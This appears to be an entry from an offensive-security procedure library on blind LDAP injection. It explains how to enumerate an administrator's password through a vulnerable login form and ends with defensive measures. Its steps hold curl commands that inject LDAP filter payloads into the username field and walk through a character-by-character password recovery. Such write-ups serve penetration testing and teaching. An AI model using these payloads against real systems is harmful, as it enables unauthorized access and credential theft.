---
id: 046927cc-b707-46b7-8c59-427742b39340
name: Blind-LDAP-Injection-for-Password-Enumeration
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:01.636484+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - >-
    [[techniques/Exploitation of Public-Facing Application|T1190 - Exploitation
    of Public-Facing Application]]
  - '[[techniques/Account Discovery|T1087 - Account Discovery]]'
sub_techniques: []
tags:
  - '[[tags/Blind Exploitation]]'
  - '[[tags/LDAP Injection]]'
  - '[[tags/Password Enumeration]]'
commands:
  - '[[commands/curl-inject-ldap-filter]]'
platforms:
  - Web
tools: []
validated: true
---

# Blind-LDAP-Injection-for-Password-Enumeration

## Summary

This procedure demonstrates how to perform blind LDAP injection to enumerate passwords in a vulnerable web application that uses LDAP for authentication. By injecting crafted LDAP filters into user input fields (such as username or password), an attacker can force the application to execute boolean-based queries, inferring information from success (OK) or failure (KO) responses without direct data leakage.

## Description

LDAP injection occurs when user-supplied input is improperly sanitized and concatenated into LDAP queries, allowing attackers to manipulate the query logic. In a blind scenario, the application does not return query results or errors that reveal data directly; instead, differences in response behavior (e.g., login success vs. failure, page load time, or content variations) indicate whether the injected filter matched. This procedure focuses on enumerating a target account's password character by character using wildcard-based filters like (password=*) for existence checks and narrowing ranges (e.g., (password=A*)). It assumes a login form vulnerable to injection in the username field, targeting an account like 'administrator'. The technique is useful for gaining unauthorized access in web apps with LDAP backends, such as directory services or authentication portals.

## Requirements

1. Network access to the vulnerable web application (e.g., login endpoint).
2. Knowledge of the target LDAP attribute structure (e.g., 'sn' for surname, 'password' for credential field).
3. A proxy tool like Burp Suite to intercept and modify requests, or direct use of curl for injection.
4. Basic understanding of LDAP filter syntax.

## Defense

- Implement strict input validation and sanitization for all user inputs used in LDAP queries, escaping special characters like '(', ')', '*', and '&'.
- Use parameterized LDAP queries or prepared statements to separate code from data.
- Enable comprehensive application logging for LDAP operations to detect anomalous queries.
- Implement rate limiting on authentication attempts to hinder enumeration attacks.
- Conduct regular security testing, including LDAP injection scans with tools like OWASP ZAP.

## Objectives

1. Identify a vulnerable input point for LDAP injection in the authentication flow.
2. Enumerate the target account's password length and characters using blind boolean responses.
3. Gain valid credentials for further access or privilege escalation.
4. Extract sensitive directory information if the injection allows broader queries.

## Instructions

### Step 1: Identify the Injection Point

**Context**: Test the login form to confirm LDAP injection vulnerability. Submit payloads that alter the LDAP query structure, observing if responses differ based on filter logic (e.g., always-true vs. always-false filters).

**Command** ([[commands/curl-inject-ldap-filter]]):
```bash
curl -X POST http://target.com/login -d "username=*&password=dummy" -v
```

> This sends a wildcard (*) in the username field to match any entry, potentially causing a successful authentication if the backend executes (&(objectClass=*)(uid=*)) or similar. Expected output: A success response (e.g., HTTP 200 with login page or redirect) indicating the filter was processed. If it fails uniformly, try variations like ')(sn=*)' to close the query and force a match.

### Step 2: Confirm Target Account and Enumerate Password Existence

**Context**: Verify the target account (e.g., administrator) exists and test for password field accessibility. Use filters to check if the account has any password set.

**Command** ([[commands/curl-inject-ldap-filter]]):
```bash
curl -X POST http://target.com/login -d "username=*)(sn=administrator)(password=*)&password=dummy" -v
```

> The injected filter (&(sn=administrator)(password=*)) checks for the administrator account with any password. Expected output: OK response (e.g., success or partial match indication) if the account exists; KO (failure) otherwise. Adjust the injection point if needed (e.g., in password field).

### Step 3: Enumerate Password Length and Character Set

**Context**: Use binary search or sequential testing to narrow down password characters. Start with broad ranges (A-M vs. N-Z), then refine (e.g., MA-MB). Monitor response differences to infer matches.

**Command** ([[commands/curl-inject-ldap-filter]]):
```bash
curl -X POST http://target.com/login -d "username=*)(sn=administrator)(password=A*)&password=dummy" -v
```

> Example sequence for enumeration:
- Broad: (&(sn=administrator)(password=*)) : OK (password exists)
- Range: (&(sn=administrator)(password=A*)) : KO
- Range: (&(sn=administrator)(password=M*)) : OK
- Refine: (&(sn=administrator)(password=MA*)) : KO
- Refine: (&(sn=administrator)(password=MY*)) : OK
- Further: (&(sn=administrator)(password=MYK*)) : OK
- Exact: (&(sn=administrator)(password=MYKE)) : OK (assuming 'MYKE' is the password)

Expected output: Boolean responses (OK for match, KO for no match) allowing reconstruction of the full password, e.g., 'MYKE'. Automate with Burp Intruder for efficiency if manual testing is slow.

### Step 4: Validate and Use Credentials

**Context**: Once enumerated, test the full password in a legitimate login to confirm access.

**Command** ([[commands/curl-inject-ldap-filter]]):
```bash
curl -X POST http://target.com/login -d "username=administrator&password=MYKE" -v
```

> Expected output: Successful authentication (e.g., session cookie or redirect to dashboard), confirming the enumerated credentials work.
